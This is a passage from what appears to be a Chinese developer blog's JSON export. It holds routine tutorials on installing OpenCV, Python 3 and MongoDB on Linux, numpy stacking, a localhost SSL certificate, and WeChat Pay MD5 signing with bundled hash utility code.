进入解压后的安装包1cd opencv-3.4.5 创建 build 目录1mkdir build 进入 build 目录1cd build 设置 make 参数1cmake -D CMAKE_BUILD_TYPE=Release -D CMAKE_INSTALL_PREFIX=/usr/local .. 注：命令行最后有两个点，表示源代码在当前目录的父目录 开始构建12make# 注：此步需要等待较长时间 开始安装1make install 安装 opencv-python (可选）1pip install opencv-python 测试（可选）1python 用 python 命令启动 python 后，录入 import cv2，回车确认，若没有报错，表示安装成功","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"服务器","slug":"服务器","permalink":"http://example.com/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/"}]},{"title":"python -m 参数释义","slug":"python -m 参数释义","date":"2019-01-02T03:16:34.000Z","updated":"2024-09-21T03:25:29.635Z","comments":true,"path":"2019/01/02/python -m 参数释义/","permalink":"http://example.com/2019/01/02/python%20-m%20%E5%8F%82%E6%95%B0%E9%87%8A%E4%B9%89/","excerpt":"","text":"官方文档-m: run library module as a script（将模块当作脚本运行） 解释在 python 中，所谓的模块，其实也是一个由代码组成的普通脚本文件。这些文件通常会提供一些有用的东西，例如函数或者类，然后我们通过 import 导入使用，而且当我们引入模块的时候，不会产生副作用。但实际上如果我们在 shell 中直接运行这个脚本文件，很有可能会看到有副作用产生。在文件内部，我们一般通过下面的代码来区分当前脚本，是作为模块导入，还是作为脚本直接运行。 12if __name__ == &#x27;__main__&#x27;: print(&#x27;模块直接运行&#x27;); 当文件作为脚本直接运行时，这段代码会产生副作用，输出字符串“模块直接运行”；当文件作为模块被导入时，不会产生副作用，不输出字符串“模块直接运行”； 回到正题，当我们知道一个模块的名字，但不知道它的路径时，我们可以通过 -m 参数，在 shell 中将该模块当作脚本运行，例如： 1python -m module_name 事实上，如果我们知道模块的完整路径（此处假设为”&#x2F;path&#x2F;to&#x2F;module.py”），上述命令的效果，以下面的命令等同 1python /path/to/module.py","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"}]},{"title":"人工智能、机器学习、深度学习的区别","slug":"人工智能、机器学习、深度学习的区别","date":"2018-12-22T07:29:01.000Z","updated":"2024-09-21T03:25:58.068Z","comments":true,"path":"2018/12/22/人工智能、机器学习、深度学习的区别/","permalink":"http://example.com/2018/12/22/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E3%80%81%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E3%80%81%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E5%8C%BA%E5%88%AB/","excerpt":"","text":"人工智能将通常由人类完成的智能任务，尽量实现自动化； 机器学习与程序设计的区别在传统的程序设计中，我们告知计算机数据和计算规则，计算机输出计算结果；对于机器学习，我们告知计算机数据和计算结果，计算机输出计算规则；因此，机器学习应用，是通过数据训练出来的，而不是通过程序编写出来的； 机器学习与深度学习的区别对于机器学习，它需要将输入的数据，转换 成有意义的表示，然后从有意义的表示中，获取我们想要的结果；对于以前传统的机器学习方法，这种 转换 只涉及 1 ~ 2 层，对于深度学习，这种转换可能涉及几十上百甚至上万层，所以叫做”深度学习“ 机器学习的三要素 样本数据集 预期输出的示例 衡量结果好坏的方法 机器学习的核心在预先定义的一组方法（即假设空间 hypothesis space ）中，找到一种有意义的变换数据的方法，使得数据转换成更加有用的表示（representation） 深度学习中“深度”的意思 深度（depth） 是指学习的过程，涉及很多层级的堆叠，所以深度学习也叫层级表示学习（hierarchical representation learning） ，或叫分层表示学习（layer representation learning）； 分层的做法，来源于神经网络模型（neural network）启发，但事实上它跟人类大脑的神经网络模型，并没有任何关系；只是恰好用这个启发，来命名这个学习模型而已； 传统的机器学习由于只涉及 1~2 层的数据表示，因此有时也叫做浅层学习（shallow learning）； 深度学习可以简单理解为：一种学习数据表示的多级方法；每一级的方法，就像是一个蒸馏的操作，虽然每经过一级变换，数据变得越来越少，但纯度却越来越高，从而跟要解决的任务越来越相关； 深度学习的工作原理 权重（weight） ：神经网络中，某一层对数据所做的变换操作，存储于该层的权重中；权重是一组数字，它是该层数据变换操作的参数（parameter） ；每层的数据变换操作，通过权重来实现操作的参数化（parameterize） ； 学习的过程，即为神经网络中的所有层，找到一组最合适的权重值，使得输入的示例，能够与目标一一对应； 损失函数（loss function） ：用于计算神经网络的预测值与真实目标值之间的差距（损失值）；损失函数有时也叫目标函数（objective function） 深度学习技巧：根据损失函数计算出的差距（损失值），作为反馈信号，对权重进行微调，以降低下一次计算的损失值；这种调节由优化器（optimizer）来完成，它使用了反向传播算法（back propagation）的原理； 整个调节的过程，称为训练循环；通过对几千个示例，进行几十次的循环，最后就有可能得到损失值最小的计算模型；","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"深度学习","slug":"深度学习","permalink":"http://example.com/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"}]},{"title":"numpy vstack hstack dstack 区别","slug":"numpy vstack hstack dstack 区别","date":"2018-11-15T07:48:53.000Z","updated":"2024-09-21T03:25:25.076Z","comments":true,"path":"2018/11/15/numpy vstack hstack dstack 区别/","permalink":"http://example.com/2018/11/15/numpy%20vstack%20hstack%20dstack%20%E5%8C%BA%E5%88%AB/","excerpt":"","text":"先假设有如下数据（用于示范三种函数给这些数据带来的操作效果）123456789101112131415161718import numpy as npdata1 = [[[11, 12, 13], [14, 15, 16], [17, 18, 19]],[[21, 22, 23], [24, 25, 26], [27, 28, 29]],[[31, 32, 33], [34, 35, 36], [37, 38, 39]]]data2 = [[[41, 42, 43], [44, 45, 46], [47, 48, 49]],[[51, 52, 53], [54, 55, 56], [57, 58, 59]],[[61, 62, 63], [64, 65, 66], [67, 68, 69]]]arr1 = np.array(data1)arr2 = np.array(data2)# arr1.shape == [3, 3, 3]# arr2.shape == [3, 3, 3] vstack 解释vstack 表示将数组在第一维进行堆叠（即最外层的方括号），可将 arr1 和 arr2 第一维内的部分视为一个整体，即： 123arr1 == [块1], arr2 == [块2]vstack((arr1, arr2)) == [块1 + 块2] 123456789101112a = np.vstack((arr1, arr2))print a# 结果如下[[[11, 12, 13], [14, 15, 16], [17, 18, 19]],[[21, 22, 23], [24, 25, 26], [27, 28, 29]],[[31, 32, 33], [34, 35, 36], [37, 38, 39]],[[41, 42, 43], [44, 45, 46], [47, 48, 49]],[[51, 52, 53], [54, 55, 56], [57, 58, 59]],[[61, 62, 63], [64, 65, 66], [67, 68, 69]]]# 此时 a.shape == [6, 3, 3] hstack 解释hstack 表示将数组在第二维进行堆叠（即第二层方括号），可将 arr 第二层括号里面的东西视为一个整体，即 123456789101112131415161718arr1 == [[块1],[块2],[块3]]arr2 == [[块4],[块5],[块6]]# 然后 hstack((arr1, arr2)) 的结果如下：[[块1 + 块4],[块2 + 块5],[块3 + 块6]] 123456789b = np.hstack((arr1, arr2))print b# 结果如下：[[[11, 12, 13], [14, 15, 16], [17, 18, 19], [41, 42, 43], [44, 45, 46], [47, 48, 49]],[[21, 22, 23], [24, 25, 26], [27, 28, 29], [51, 52, 53], [54, 55, 56], [57, 58, 59]],[[31, 32, 33], [34, 35, 36], [37, 38, 39], [61, 62, 63], [64, 65, 66], [67, 68, 69]]]# 此时 b.shape == [3, 6, 3] dstack 解释dstack 表示将数组在第三维进行堆叠（即第三层方括号），可将 arr 第三层括号里面的东西视为一个整体，即： 123456789101112131415161718arr1 = [[[块1], [块2], [块3]],[[块4], [块5], [块6]],[[块7], [块8], [块9]]]arr2 = [[[块11], [块12], [块13]],[[块14], [块15], [块16]],[[块17], [块18], [块19]]]# 然后 dstack((arr1, arr2)) 的结果如下：[[[块1 + 块11],[块2 + 块12],[块3 + 块13]][[块4 + 块14],[块5 + 块15],[块6 + 块16]][[块7 + 块17],[块8 + 块18],[块9 + 块19]]] 12345678910print c# 结果如下:[[[11 12 13 41 42 43],[14 15 16 44 45 46],[17 18 19 47 48 49]][[21 22 23 51 52 53],[24 25 26 54 55 56],[27 28 29 57 58 59]][[31 32 33 61 62 63],[34 35 36 64 65 66],[37 38 39 67 68 69]]]# 此时 c.shape == [3, 3, 6]","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"}]},{"title":"localhost 添加 SSL 证书 （Windows环境 )","slug":"localhost 添加 SSL 证书 （Windows环境 )","date":"2018-08-17T04:35:10.000Z","updated":"2024-09-21T02:54:21.380Z","comments":true,"path":"2018/08/17/localhost 添加 SSL 证书 （Windows环境 )/","permalink":"http://example.com/2018/08/17/localhost%20%E6%B7%BB%E5%8A%A0%20SSL%20%E8%AF%81%E4%B9%A6%20%EF%BC%88Windows%E7%8E%AF%E5%A2%83%20)/","excerpt":"","text":"安装 OpenSSL由于 Windows 不像 Mac OS 和 Linux 自带 openssl，需要另外下载安装；下载链接：http://downloads.sourceforge.net/gnuwin32/openssl-0.9.8h-1-setup.exe点此下载 安装过程略，假设按默认的安装位置为 C:\\Program Files (x86)\\GnuWin32 新建配置文件使用记事本或者其他编辑器，新建文件，命名为 localhost.cnf （注：后缀为 cnf，不是 txt）文件内容设置如下并保存： 12345678910[dn]CN=localhost[req]distinguished_name = dn[EXT]subjectAltName=DNS:localhostkeyUsage=digitalSignatureextendedKeyUsage=serverAuth 假设以上文件的保存位置为 d:\\localhost.cnf，后续会用到 进入命令行界面注：需以管理员身份进入命令行界面进入方式：可以通过右键点击左下角的“开始”按钮或者 进入 OpenSSL 安装文件夹注：假设 OpenSSL 的安装位置为 ‘C:\\Program Files (x86)\\GnuWin32’， 1cd &#x27;C:\\Program Files (x86)\\GnuWin32\\bin&#x27; 执行后类似下面截图： 执行命令1.\\openssl req -x509 -out localhost.crt -keyout localhost.key -newkey rsa:2048 -nodes -sha256 -subj &#x27;/CN=localhost&#x27; -extensions EXT -config d:\\localhost.cnf 注： 由于没有将 openssl 所在路径添加的系统变量 path 中，所以此处 openssl 命令前面需要有 .\\ 两个符号，别漏了； 命令行中，最后的路径 d:\\localhost.cnf 为上一步骤创建的配置文件的保存位置，如果路径不同，则相应修改； 执行后类似下面的截图： 证书生成成功 拷贝证书进入 openssl 的安装文件夹，拷贝已经生成好的证书到需要使用的位置 使用证书示例以下示例假设在 Express 中使用","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"}]},{"title":"CentOS 安装 Python3","slug":"CentOS 安装 Python3","date":"2018-08-09T08:09:54.000Z","updated":"2024-09-21T03:24:20.471Z","comments":true,"path":"2018/08/09/CentOS 安装 Python3/","permalink":"http://example.com/2018/08/09/CentOS%20%E5%AE%89%E8%A3%85%20Python3/","excerpt":"","text":"创建一个目录用来放下载的安装包源文件sudo mkdir /usr/local/src/python注：若有管理员权限，则 sudo 可以省略，以下同；此处假设源文件存在 &#x2F;usr&#x2F;local&#x2F;src&#x2F;python，也可以存放其他文件夹，相应修改路径即可； 进入该目录cd /usr/local/src/python 下载安装包sudo wget https://www.python.org/ftp/python/3.7.0/Python-3.7.0.tgz注：此处假设最新版本为3.7.0，如不是，则相应修改 解压安装包sudo tar -zxvf Python-3.7.0.tgz 进入解压后的文件夹cd Python-3.7.0 设置安装目录此处假设为 &#x2F;usr&#x2F;local&#x2F;python3 sudo ./configure --prefix=/usr/local/python3 编译源文件sudo make 安装源文件sudo make install 建立 python3 软连接（类似建立快捷方式）sudo ln /usr/local/python3/bin/python3 /usr/bin/python3 建立 pip3 软连接sudo ln /usr/local/python3/bin/pip3 /usr/bin/pip3 测试pyhton3 -V若成功屏幕会显示如下 1Python 3.7.0","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"服务器","slug":"服务器","permalink":"http://example.com/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/"}]},{"title":"微信支付 MD5 签名中文问题","slug":"微信支付 MD5 签名中文问题","date":"2018-07-27T03:44:09.000Z","updated":"2024-09-21T03:23:59.187Z","comments":true,"path":"2018/07/27/微信支付 MD5 签名中文问题/","permalink":"http://example.com/2018/07/27/%E5%BE%AE%E4%BF%A1%E6%94%AF%E4%BB%98%20MD5%20%E7%AD%BE%E5%90%8D%E4%B8%AD%E6%96%87%E9%97%AE%E9%A2%98/","excerpt":"","text":"微信支付流程中， 需要先调用微信商户平台的统一下单接口，生成 prepay_id，传输的参数值通常包含中文，示例如下：因此，在进行 MD5 生成签名时，需要注意能够支持中文（注：部分第三方模块存在不支持中文的情况，导致生成的签名，与微信后台生成的签名不一致，出现”签名错误“的提示） 微信公众平台支付接口调试工具（左边地址可以对签名进行调试比对） 解决办法：使用支持中文的MD5 模块即可（模块附后）； 12var md5 = require(&#x27;./lib/js/md5.js&#x27;) // 此处 md5 的存放地址为假设，应根据实际情况调整，md5 模块详细内容附后；var sign = md5(stringSignTemp).toUpperCase(); //假设 stringSignTemp 已经整理好 以下是 md5 模块，其中用到的 crypto 模块也附在本文后面； 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191var crypt = require(&#x27;./crypto.js&#x27;);var charenc = &#123; // UTF-8 encoding utf8: &#123; // Convert a string to a byte array stringToBytes: function(str) &#123; return charenc.bin.stringToBytes(unescape(encodeURIComponent(str))); &#125;, // Convert a byte array to a string bytesToString: function(bytes) &#123; return decodeURIComponent(escape(charenc.bin.bytesToString(bytes))); &#125; &#125;, // Binary encoding bin: &#123; // Convert a string to a byte array stringToBytes: function(str) &#123; for (var bytes = [], i = 0; i &lt; str.length; i++) bytes.push(str.charCodeAt(i) &amp; 0xFF); return bytes; &#125;, // Convert a byte array to a string bytesToString: function(bytes) &#123; for (var str = [], i = 0; i &lt; bytes.length; i++) str.push(String.fromCharCode(bytes[i])); return str.join(&#x27;&#x27;); &#125; &#125;&#125;;var utf8 = charenc.utf8;var bin = charenc.bin;function isBuffer(obj) &#123; return !!obj.constructor &amp;&amp; typeof obj.constructor.isBuffer === &#x27;function&#x27; &amp;&amp; obj.constructor.isBuffer(obj)&#125;// The corevar md5 = function(message, options) &#123; // Convert to byte array if (message.constructor == String) if (options &amp;&amp; options.encoding === &#x27;binary&#x27;) message = bin.stringToBytes(message); else message = utf8.stringToBytes(message); else if (isBuffer(message)) message = Array.prototype.slice.call(message, 0); else if (!Array.isArray(message)) message = message.toString(); // else, assume byte array already var m = crypt.util.bytesToWords(message), l = message.length * 8, a = 1732584193, b = -271733879, c = -1732584194, d = 271733878; // Swap endian for (var i = 0; i &lt; m.length; i++) &#123; m[i] = ((m[i] &lt;&lt; 8) | (m[i] &gt;&gt;&gt; 24)) &amp; 0x00FF00FF | ((m[i] &lt;&lt; 24) | (m[i] &gt;&gt;&gt; 8)) &amp; 0xFF00FF00; &#125; // Padding m[l &gt;&gt;&gt; 5] |= 0x80 &lt;&lt; (l % 32); m[(((l + 64) &gt;&gt;&gt; 9) &lt;&lt; 4) + 14] = l; // Method shortcuts var FF = md5._ff, GG = md5._gg, HH = md5._hh, II = md5._ii; for (var i = 0; i &lt; m.length; i += 16) &#123; var aa = a, bb = b, cc = c, dd = d; a = FF(a, b, c, d, m[i + 0], 7, -680876936); d = FF(d, a, b, c, m[i + 1], 12, -389564586); c = FF(c, d, a, b, m[i + 2], 17, 606105819); b = FF(b, c, d, a, m[i + 3], 22, -1044525330); a = FF(a, b, c, d, m[i + 4], 7, -176418897); d = FF(d, a, b, c, m[i + 5], 12, 1200080426); c = FF(c, d, a, b, m[i + 6], 17, -1473231341); b = FF(b, c, d, a, m[i + 7], 22, -45705983); a = FF(a, b, c, d, m[i + 8], 7, 1770035416); d = FF(d, a, b, c, m[i + 9], 12, -1958414417); c = FF(c, d, a, b, m[i + 10], 17, -42063); b = FF(b, c, d, a, m[i + 11], 22, -1990404162); a = FF(a, b, c, d, m[i + 12], 7, 1804603682); d = FF(d, a, b, c, m[i + 13], 12, -40341101); c = FF(c, d, a, b, m[i + 14], 17, -1502002290); b = FF(b, c, d, a, m[i + 15], 22, 1236535329); a = GG(a, b, c, d, m[i + 1], 5, -165796510); d = GG(d, a, b, c, m[i + 6], 9, -1069501632); c = GG(c, d, a, b, m[i + 11], 14, 643717713); b = GG(b, c, d, a, m[i + 0], 20, -373897302); a = GG(a, b, c, d, m[i + 5], 5, -701558691); d = GG(d, a, b, c, m[i + 10], 9, 38016083); c = GG(c, d, a, b, m[i + 15], 14, -660478335); b = GG(b, c, d, a, m[i + 4], 20, -405537848); a = GG(a, b, c, d, m[i + 9], 5, 568446438); d = GG(d, a, b, c, m[i + 14], 9, -1019803690); c = GG(c, d, a, b, m[i + 3], 14, -187363961); b = GG(b, c, d, a, m[i + 8], 20, 1163531501); a = GG(a, b, c, d, m[i + 13], 5, -1444681467); d = GG(d, a, b, c, m[i + 2], 9, -51403784); c = GG(c, d, a, b, m[i + 7], 14, 1735328473); b = GG(b, c, d, a, m[i + 12], 20, -1926607734); a = HH(a, b, c, d, m[i + 5], 4, -378558); d = HH(d, a, b, c, m[i + 8], 11, -2022574463); c = HH(c, d, a, b, m[i + 11], 16, 1839030562); b = HH(b, c, d, a, m[i + 14], 23, -35309556); a = HH(a, b, c, d, m[i + 1], 4, -1530992060); d = HH(d, a, b, c, m[i + 4], 11, 1272893353); c = HH(c, d, a, b, m[i + 7], 16, -155497632); b = HH(b, c, d, a, m[i + 10], 23, -1094730640); a = HH(a, b, c, d, m[i + 13], 4, 681279174); d = HH(d, a, b, c, m[i + 0], 11, -358537222); c = HH(c, d, a, b, m[i + 3], 16, -722521979); b = HH(b, c, d, a, m[i + 6], 23, 76029189); a = HH(a, b, c, d, m[i + 9], 4, -640364487); d = HH(d, a, b, c, m[i + 12], 11, -421815835); c = HH(c, d, a, b, m[i + 15], 16, 530742520); b = HH(b, c, d, a, m[i + 2], 23, -995338651); a = II(a, b, c, d, m[i + 0], 6, -198630844); d = II(d, a, b, c, m[i + 7], 10, 1126891415); c = II(c, d, a, b, m[i + 14], 15, -1416354905); b = II(b, c, d, a, m[i + 5], 21, -57434055); a = II(a, b, c, d, m[i + 12], 6, 1700485571); d = II(d, a, b, c, m[i + 3], 10, -1894986606); c = II(c, d, a, b, m[i + 10], 15, -1051523); b = II(b, c, d, a, m[i + 1], 21, -2054922799); a = II(a, b, c, d, m[i + 8], 6, 1873313359); d = II(d, a, b, c, m[i + 15], 10, -30611744); c = II(c, d, a, b, m[i + 6], 15, -1560198380); b = II(b, c, d, a, m[i + 13], 21, 1309151649); a = II(a, b, c, d, m[i + 4], 6, -145523070); d = II(d, a, b, c, m[i + 11], 10, -1120210379); c = II(c, d, a, b, m[i + 2], 15, 718787259); b = II(b, c, d, a, m[i + 9], 21, -343485551); a = (a + aa) &gt;&gt;&gt; 0; b = (b + bb) &gt;&gt;&gt; 0; c = (c + cc) &gt;&gt;&gt; 0; d = (d + dd) &gt;&gt;&gt; 0; &#125; return crypt.util.endian([a, b, c, d]);&#125;;// Auxiliary functionsmd5._ff = function(a, b, c, d, x, s, t) &#123; var n = a + (b &amp; c | ~b &amp; d) + (x &gt;&gt;&gt; 0) + t; return ((n &lt;&lt; s) | (n &gt;&gt;&gt; (32 - s))) + b;&#125;;md5._gg = function(a, b, c, d, x, s, t) &#123; var n = a + (b &amp; d | c &amp; ~d) + (x &gt;&gt;&gt; 0) + t; return ((n &lt;&lt; s) | (n &gt;&gt;&gt; (32 - s))) + b;&#125;;md5._hh = function(a, b, c, d, x, s, t) &#123; var n = a + (b ^ c ^ d) + (x &gt;&gt;&gt; 0) + t; return ((n &lt;&lt; s) | (n &gt;&gt;&gt; (32 - s))) + b;&#125;;md5._ii = function(a, b, c, d, x, s, t) &#123; var n = a + (c ^ (b | ~d)) + (x &gt;&gt;&gt; 0) + t; return ((n &lt;&lt; s) | (n &gt;&gt;&gt; (32 - s))) + b;&#125;;// Package private blocksizemd5._blocksize = 16;md5._digestsize = 16;module.exports = function(message, options) &#123; if (message === undefined || message === null) throw new Error(&#x27;Illegal argument &#x27; + message); var digestbytes = crypt.util.wordsToBytes(md5(message, options)); return options &amp;&amp; options.asBytes ? digestbytes : options &amp;&amp; options.asString ? bin.bytesToString(digestbytes) : crypt.util.bytesToHex(digestbytes);&#125;; 以下是 crypto 模块 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185/*! * Crypto-JS v1.1.0 * http://code.google.com/p/crypto-js/ * Copyright (c) 2009, Jeff Mott. All rights reserved. * http://code.google.com/p/crypto-js/wiki/License */const Crypto = &#123;&#125;;(function()&#123;var base64map = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;;// Crypto utilitiesvar util = Crypto.util = &#123; // Bit-wise rotate left rotl: function (n, b) &#123; return (n &lt;&lt; b) | (n &gt;&gt;&gt; (32 - b)); &#125;, // Bit-wise rotate right rotr: function (n, b) &#123; return (n &lt;&lt; (32 - b)) | (n &gt;&gt;&gt; b); &#125;, // Swap big-endian to little-endian and vice versa endian: function (n) &#123; // If number given, swap endian if (n.constructor == Number) &#123; return util.rotl(n, 8) &amp; 0x00FF00FF | util.rotl(n, 24) &amp; 0xFF00FF00; &#125; // Else, assume array and swap all items for (var i = 0; i &lt; n.length; i++) n[i] = util.endian(n[i]); return n; &#125;, // Generate an array of any length of random bytes randomBytes: function (n) &#123; for (var bytes = []; n &gt; 0; n--) bytes.push(Math.floor(Math.random() * 256)); return bytes; &#125;, // Convert a string to a byte array stringToBytes: function (str) &#123; var bytes = []; for (var i = 0; i &lt; str.length; i++) bytes.push(str.charCodeAt(i)); return bytes; &#125;, // Convert a byte array to a string bytesToString: function (bytes) &#123; var str = []; for (var i = 0; i &lt; bytes.length; i++) str.push(String.fromCharCode(bytes[i])); return str.join(&quot;&quot;); &#125;, // Convert a string to big-endian 32-bit words stringToWords: function (str) &#123; var words = []; for (var c = 0, b = 0; c &lt; str.length; c++, b += 8) words[b &gt;&gt;&gt; 5] |= str.charCodeAt(c) &lt;&lt; (24 - b % 32); return words; &#125;, // Convert a byte array to big-endian 32-bits words bytesToWords: function (bytes) &#123; var words = []; for (var i = 0, b = 0; i &lt; bytes.length; i++, b += 8) words[b &gt;&gt;&gt; 5] |= bytes[i] &lt;&lt; (24 - b % 32); return words; &#125;, // Convert big-endian 32-bit words to a byte array wordsToBytes: function (words) &#123; var bytes = []; for (var b = 0; b &lt; words.length * 32; b += 8) bytes.push((words[b &gt;&gt;&gt; 5] &gt;&gt;&gt; (24 - b % 32)) &amp; 0xFF); return bytes; &#125;, // Convert a byte array to a hex string bytesToHex: function (bytes) &#123; var hex = []; for (var i = 0; i &lt; bytes.length; i++) &#123; hex.push((bytes[i] &gt;&gt;&gt; 4).toString(16)); hex.push((bytes[i] &amp; 0xF).toString(16)); &#125; return hex.join(&quot;&quot;); &#125;, // Convert a hex string to a byte array hexToBytes: function (hex) &#123; var bytes = []; for (var c = 0; c &lt; hex.length; c += 2) bytes.push(parseInt(hex.substr(c, 2), 16)); return bytes; &#125;, // Convert a byte array to a base-64 string bytesToBase64: function (bytes) &#123; // Use browser-native function if it exists if (typeof btoa == &quot;function&quot;) return btoa(util.bytesToString(bytes)); var base64 = [], overflow; for (var i = 0; i &lt; bytes.length; i++) &#123; switch (i % 3) &#123; case 0: base64.push(base64map.charAt(bytes[i] &gt;&gt;&gt; 2)); overflow = (bytes[i] &amp; 0x3) &lt;&lt; 4; break; case 1: base64.push(base64map.charAt(overflow | (bytes[i] &gt;&gt;&gt; 4))); overflow = (bytes[i] &amp; 0xF) &lt;&lt; 2; break; case 2: base64.push(base64map.charAt(overflow | (bytes[i] &gt;&gt;&gt; 6))); base64.push(base64map.charAt(bytes[i] &amp; 0x3F)); overflow = -1; &#125; &#125; // Encode overflow bits, if there are any if (overflow != undefined &amp;&amp; overflow != -1) base64.push(base64map.charAt(overflow)); // Add padding while (base64.length % 4 != 0) base64.push(&quot;=&quot;); return base64.join(&quot;&quot;); &#125;, // Convert a base-64 string to a byte array base64ToBytes: function (base64) &#123; // Use browser-native function if it exists if (typeof atob == &quot;function&quot;) return util.stringToBytes(atob(base64)); // Remove non-base-64 characters base64 = base64.replace(/[^A-Z0-9+\\/]/ig, &quot;&quot;); var bytes = []; for (var i = 0; i &lt; base64.length; i++) &#123; switch (i % 4) &#123; case 1: bytes.push((base64map.indexOf(base64.charAt(i - 1)) &lt;&lt; 2) | (base64map.indexOf(base64.charAt(i)) &gt;&gt;&gt; 4)); break; case 2: bytes.push(((base64map.indexOf(base64.charAt(i - 1)) &amp; 0xF) &lt;&lt; 4) | (base64map.indexOf(base64.charAt(i)) &gt;&gt;&gt; 2)); break; case 3: bytes.push(((base64map.indexOf(base64.charAt(i - 1)) &amp; 0x3) &lt;&lt; 6) | (base64map.indexOf(base64.charAt(i)))); break; &#125; &#125; return bytes; &#125;&#125;;// Crypto mode namespaceCrypto.mode = &#123;&#125;;&#125;)();module.exports = Crypto;","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"javascript","slug":"javascript","permalink":"http://example.com/tags/javascript/"},{"name":"微信","slug":"微信","permalink":"http://example.com/tags/%E5%BE%AE%E4%BF%A1/"}]},{"title":"微信支付 mch_id 参数格式错误","slug":"微信支付 mch_id 参数格式错误","date":"2018-07-27T03:26:25.000Z","updated":"2024-09-21T03:23:55.798Z","comments":true,"path":"2018/07/27/微信支付 mch_id 参数格式错误/","permalink":"http://example.com/2018/07/27/%E5%BE%AE%E4%BF%A1%E6%94%AF%E4%BB%98%20mch_id%20%E5%8F%82%E6%95%B0%E6%A0%BC%E5%BC%8F%E9%94%99%E8%AF%AF/","excerpt":"","text":"为了避免使用全局变量，有两个办法 办法一：设计一个函数，并将函数内的方法添加到全局对象 window 上（这种方法虽然可以避免全局变量，却难免要应对全局对象上方法的命名冲突） 办法二：设计一个对象，对象里面存着变量和方法，但它不直接通过定义获得（不然会变成全局变量），而是通过定义匿名函数并马上运行它来返回所需要的对象","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"javascript","slug":"javascript","permalink":"http://example.com/tags/javascript/"},{"name":"微信","slug":"微信","permalink":"http://example.com/tags/%E5%BE%AE%E4%BF%A1/"}]},{"title":"Linux MongoDB 安装并设置开机启动","slug":"Linux MongoDB 安装并设置开机启动","date":"2018-06-10T09:52:30.000Z","updated":"2024-09-21T02:51:05.458Z","comments":true,"path":"2018/06/10/Linux MongoDB 安装并设置开机启动/","permalink":"http://example.com/2018/06/10/Linux%20MongoDB%20%E5%AE%89%E8%A3%85%E5%B9%B6%E8%AE%BE%E7%BD%AE%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8/","excerpt":"","text":"安装 MongoDB（注：以下是基于 linux 系统） 进入源码目录（注：一般将下载的源码文件统一放在这个目录下，当然也可以不放这里，看个人需要）1cd /usr/local/src 下载安装包1wget https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-3.6.5.tgz 注：此处假设最新版本为 3.6.5，如果不是要下载这个版本，则相应修改 #####解压安装包 1tar -zxvf mongodb-linux-x86_64-3.6.5.tgz #####将解压后的文件夹，移动到安装目录注：此处假设安装目录为：&#x2F;usr&#x2F;local&#x2F;mongodb，此目录不用提前创建，mv 命令会自动创建文件夹并重命名为 mongodb； 1mv mongodb-linux-x86_64-3.6.5 /usr/local/mongodb #####检查文件夹移动成功 1ls /usr/local/mongodb/bin 如果成功，此目录下会显示此目录下有如下一些文件 1mongod mongo mongodump mongoexport mongoimport...... 将 MongoDB 的可执行命令文件夹 bin 添加到 PATH 路径中注：此步骤可选，其好处是每次执行命令不用指定路径，方便一些； 1export PATH=/usr/local/mongodb/bin:$PATH #####至此， MongoDB 安装完毕 #设置开机启动#####创建数据存放目录 1mkdir /data/db 注：此处假设数据存放目录为 &#x2F;data&#x2F;db，可根据实际情况更改为其他路径；#####创建日志存放目录 1mkdir /data/logs 注：此处假设数据存放目录为 &#x2F;data&#x2F;logs，可根据实际情况需要更改为其他路径；#####创建日志存放文件 1touch /data/logs/mongodb.log #####创建启动的配置文件 1vi /usr/local/mongodb/bin/mongodb.conf 在文件中输入以下内容 1234dbpath = /data/db #数据存放路径，与刚才创建的目录一致logpath = /data/logs/mongodb.log #日志文件存放路径；port = 27017 #端口fork = true #以守护程序的方式启用，即可以在后台运行 保存退出；######编辑开机启动文件 1vi /etc/rc.local 在文件底部增加如下一行语句，以便启动时执行； 1/usr/local/mongodb/bin/mongod --config /usr/local/mongodb/bin/mongodb.conf 保存退出； 运行如下命令，启动 mongodb1/usr/local/mongodb/bin/mongod --config /usr/local/mongodb/bin/mongodb.conf 运行如下命令，检查 mongodb 启动成功1/usr/local/mongodb/bin/mongo 如果成功，界面上会出现如下提示： 重启，输入以下命令，检查开机启动是否设置成功1/usr/local/mongodb/bin/mongo 如果成功，会出现和以上相同的提示界面： 注：如果在安装的时候，有将 mongo 命令添加到 PATH，则此时只需要输入 